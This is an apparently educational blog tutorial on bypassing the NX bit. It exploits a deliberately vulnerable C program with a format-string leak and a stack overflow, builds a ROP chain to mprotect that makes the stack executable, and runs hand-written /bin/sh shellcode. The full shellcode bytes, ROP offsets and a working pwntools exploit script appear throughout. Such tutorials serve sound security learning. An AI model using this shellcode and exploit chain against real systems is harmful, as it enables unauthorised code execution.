---
layout: post
title: "Marking The Stack As Executable"
date: 2021-1-11
---

The [No-execute (NX) bit](https://en.wikipedia.org/wiki/NX_bit) allows operating systems to mark a page as "executable" or "non-executable." A common method of bypassing this technique involves using [return-oriented programming (ROP)](https://nihaal-prasad.github.io/2020/10/14/return-oriented-programming-tutorial.html); however, there is another method that works as well. This method of defeating NX involves modifying the stack so that it is executable.

The Linux function [`mprotect(void *addr, size_t len, int prot)`](https://man7.org/linux/man-pages/man2/mprotect.2.html) can be used to modify the access permissions of any page of memory. If an attacker can ROP to this function, he/she can use it to mark the stack as executable. Then he/she can jump to their shellcode on the stack, and because the stack has been marked as executable, the shellcode will execute without any problems.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char buf[100];
    printf("Format string vuln: ");
    fgets(buf, 100, stdin);
    printf(buf);
    printf("Stack overflow vuln: ");
    fgets(buf, 1000, stdin);
    return 0;
}
```

The code shown above has two vulnerabilities:
1. An information leak due to a format string vulnerability.
2. A stack buffer overflow.

An attacker can take control over `RIP` after writing 120 bytes into the second call to `fgets()`.
```sh
$ python3 -c "import sys; sys.stdout.buffer.write(b'\n' + b'A'*120 + b'BBBBBBBB')" > input
$ gdb test
GNU gdb (Debian 10.1-1.4) 10.1
Copyright (C) 2020 Free Software Foundation, Inc.

[...]

gef➤  r < input
Starting program: /home/nihaal/Desktop/test/test < input

[...]

gef➤  info frame
Stack level 0, frame at 0x7fffffffe018:
 rip = 0x5555555551bd in main; saved rip = 0x4242424242424242
 Arglist at 0x4141414141414141, args:
 Locals at 0x4141414141414141, Previous frame's sp is 0x7fffffffe020
 Saved registers:
  rip at 0x7fffffffe018
```

In order to get this exploit to work, we'll have to exploit the format string vulnerability to leak addresses from the stack. Then we can calculate the offsets of all other addresses that we need for our exploit.
```sh
gef➤  r
Starting program: /home/nihaal/Desktop/test/test
Format string vuln: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x5555555596b1.(nil).0x5555555596cf.0x7fffffffdfa0.0x7ffff7fadbe0.0x7fffffffe108.0x100000000.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.
Stack overflow vuln:
```

After leaking the addresses, I used Ctrl-C to pause execution in GDB. Then I printed out the memory mapping.
```sh
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/nihaal/Desktop/test/test
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/nihaal/Desktop/test/test
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/nihaal/Desktop/test/test
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/nihaal/Desktop/test/test
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/nihaal/Desktop/test/test
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7def000 0x00007ffff7e14000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7e14000 0x00007ffff7f5f000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7f5f000 0x00007ffff7fa9000 0x0000000000170000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fa9000 0x00007ffff7faa000 0x00000000001ba000 --- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7faa000 0x00007ffff7fad000 0x00000000001ba000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001bd000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x00007ffff7fb0000 0x00007ffff7fb6000 0x0000000000000000 rw-
0x00007ffff7fcc000 0x00007ffff7fd0000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd0000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7fd3000 0x00007ffff7ff3000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ff3000 0x00007ffff7ffb000 0x0000000000021000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.31.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

Note that `0x7fffffffdfa0` is the third address leaked from the program (starting from zero), and it is `0x7fffffffdfa0 - 0x7ffffffde000 = 0x1ffa0` bytes away from the start of the stack. Also note that `0x7ffff7fadbe0`, the fourth address leaked from the stack, is `0x7ffff7fadbe0 - 0x7ffff7def000 = 0x1bebe0` bytes away from the base of libc. Another interesting thing to note is that the third address leaked from the program points to the start of our buffer.
```sh
gef➤  x/s 0x7fffffffdfa0
0x7fffffffdfa0: "%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.\n"
gef➤  disas mprotect
Dump of assembler code for function mprotect:
   0x00007ffff7ee7bc0 <+0>:     mov    eax,0xa
   0x00007ffff7ee7bc5 <+5>:     syscall
   0x00007ffff7ee7bc7 <+7>:     cmp    rax,0xfffffffffffff001
   0x00007ffff7ee7bcd <+13>:    jae    0x7ffff7ee7bd0 <mprotect+16>
   0x00007ffff7ee7bcf <+15>:    ret
   0x00007ffff7ee7bd0 <+16>:    mov    rcx,QWORD PTR [rip+0xc5299]        # 0x7ffff7face70
   0x00007ffff7ee7bd7 <+23>:    neg    eax
   0x00007ffff7ee7bd9 <+25>:    mov    DWORD PTR fs:[rcx],eax
   0x00007ffff7ee7bdc <+28>:    or     rax,0xffffffffffffffff
   0x00007ffff7ee7be0 <+32>:    ret
End of assembler dump.
```

The `mprotect()` function is at address `0x7ffff7ee7bc0`, which means that it comes `0x7ffff7ee7bc0 - 0x7ffff7def000 = 0xf8bc0` bytes after the base of libc. Our goal is to call `mprotect(void *addr, size_t len, int prot)`, where `addr` is the base of the stack, `len` is the length of the stack, and `prot` is set to `PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN` (look at the [manpage](https://man7.org/linux/man-pages/man2/mprotect.2.html) for more information). In the [x86_64 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf), these parameters need to be passed into RDI, RSI, and RDX, respectively.

We will need the following three ROP gadgets for moving these parameters into RDI, RSI, and RDX.
```sh
$ ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rdi"

[...]

0x0000000000026796: pop rdi; ret;

$ ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rsi"

[...]

0x000000000002890f: pop rsi; ret;

$ ropper --file /usr/lib/x86_64-linux-gnu/libc-2.31.so --search "pop rdx"

[...]

0x00000000000cb16d: pop rdx; ret;
```

To figure out what `PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN` is actually equal to in hex, I wrote the following code in a file and compiled it.
```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>

int main(void) {
    mprotect(NULL, 0, PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN);
    return 0;
}
```

By looking at the object dump for this program, we can see that `PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN` is stored as `0x1000007` in hex.
```sh
0000000000001135 <main>:
    1135:       55                      push   rbp
    1136:       48 89 e5                mov    rbp,rsp
    1139:       ba 07 00 00 01          mov    edx,0x1000007
    113e:       be 00 00 00 00          mov    esi,0x0
    1143:       bf 00 00 00 00          mov    edi,0x0
    1148:       e8 e3 fe ff ff          call   1030 <mprotect@plt>
    114d:       b8 00 00 00 00          mov    eax,0x0
    1152:       5d                      pop    rbp
    1153:       c3                      ret
    1154:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
    115b:       00 00 00
    115e:       66 90                   xchg   ax,ax
```

This is the shellcode that I will be using for my exploit.
```
section .text ; Text section for code
global _start ; Begins execution at _start
_start:

; Close STDIN
xor rax, rax ; Clears the RAX register
xor rdi, rdi ; Zero represents STDIN
mov al, 3 ; Syscall number for close()
syscall ; Calls close(0)

; Opening "/dev/tty"
push rax ; Push a string terminator onto the stack
mov rdi, 0x7974742f7665642f ; Move "/dev/tty" (written backwards in ASCII) into RDI.
                        ; We can move this all at once because the string is exactly 8 bytes long
push rdi ; Push the string "/dev/tty" onto the stack.
push rsp ; Push a pointer to the string onto the stack.
pop rdi ; RDI now has a pointer to the string "/dev/tty"
        ; These last two lines are equivalent to doing "mov rdi, rsp"
push rax ; Push a NULL byte onto the stack
pop rsi ; Make RSI NULL
        ; These last two lines are equivalent to doing "mov rsi, 0"
mov si, 0x2702 ; Flag for O_RDWR
mov al, 0x2 ; Syscall for sys_open
syscall ; calls sys_open("/dev/tty", O_RDWR)

; Get 59 in RAX
xor rax, rax ; Clear the RAX register
mov al, 59 ; Syscall for execve

; Push a string terminator onto the stack
xor rbx, rbx ; Sets RBX to NULL
push rbx ; Pushes a NULL byte onto the stack

; Push /bin/sh onto the stack, and get a pointer to it in RDI
mov ebx, 0x68732f6e ; Moves "n/sh" (written backwards in ASCII) into lower-end bits of RBX
shl rbx, 16 ; Pushes "n/sh" to the left to make more room for 2 more bytes in RBX
mov bx, 0x6962 ; Move "bi" into lower-end bits of RBX. RBX is now equal to "bin/sh" written backwards
shl rbx, 16 ; Makes 2 extra bytes of room in RBX
mov bh, 0x2f ; "Moves /" into RBX. RBX is now equal to "\x00/bin/sh" written backwards
             ; Note that we are moving 0x2f into bh, not bl. So there is a NULL byte at the beginning
push rbx ; Push the string onto the stack
mov rdi, rsp ; Get a pointer to the string "\x00/bin/sh" in RDI
add rdi, 1 ; Add one to RDI, which will get rid of the NULL byte at the beginning.
           ; RDI now points to a string that equals "/bin/sh"

; Make these values NULL
xor rsi, rsi
xor rdx, rdx

; Call execve()
syscall
```

The hexadecimal shellcode is obtained with the following commands.
```sh
$ nasm -f elf64 -o shell.o shell.asm
$ ld -o shell shell.o
$ for i in $(objdump -m i386:x86-64 -D shell |grep "^ " |cut -f2); do echo -n \\\\x$i; done; echo

\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05
```

Now we have all the pieces necessary to build a working exploit.
```python
#!/usr/bin/env python3
from pwn import *

# Open the process
p = process("./test", stdin=PTY)

# Calculate addresses
p.sendline("%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.")
leaked_addresses = str(p.recvline()).split(".")
shellcode_addr = int(leaked_addresses[3], 16)
stack_base = shellcode_addr - 0x1ffa0
libc_base = int(leaked_addresses[4], 16) - 0x1bebe0
mprotect_addr = libc_base + 0xf8bc0
pop_rdx_addr = libc_base + 0xcb16d
pop_rsi_addr = libc_base + 0x2890f
pop_rdi_addr = libc_base + 0x26796

# Generate shellcode
shellcode = b"\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"

# Generate payload
payload = b'\x90'*(120 - len(shellcode))
payload += shellcode
payload += p64(pop_rdx_addr) # POP RDX
payload += p64(0x1000007) # PROT_READ | PROT_WRITE | PROT_EXEC | PROT_GROWSDOWN
payload += p64(pop_rsi_addr) # POP RSI
payload += p64(0x1bebe0 + 120) # Length of stack
payload += p64(pop_rdi_addr) # POP RDI
payload += p64(stack_base - (stack_base % 0x1000)) # Shellcode address
payload += p64(mprotect_addr) # mprotect()
payload += p64(shellcode_addr) # Execute shellcode

# Send payload
p.sendline(payload)
p.interactive()
```

The shellcode is executed even when NX is enabled.
```sh
$ python3 exploit.py
[+] Starting local process './test': pid 2958
[*] Switching to interactive mode
Stack overflow vuln: $ $ ls
core  exploit.py  input  test  test.c  test2  test2.c
$ $ whoami
nihaal
$ $
```

References:
1. https://burnttoys.blogspot.com/2011/04/how-to-allocate-executable-memory-on.html
2. https://man7.org/linux/man-pages/man2/mprotect.2.html
3. https://www.ret2rop.com/2018/08/make-stack-executable-again.html
4. https://aaronbloomfield.github.io/pdr/book/x86-64bit-ccc-chapter.pdf
5. https://nihaal-prasad.github.io/2020/10/14/return-oriented-programming-tutorial.html
6. https://en.wikipedia.org/wiki/NX_bit

{% include related_posts.html %}
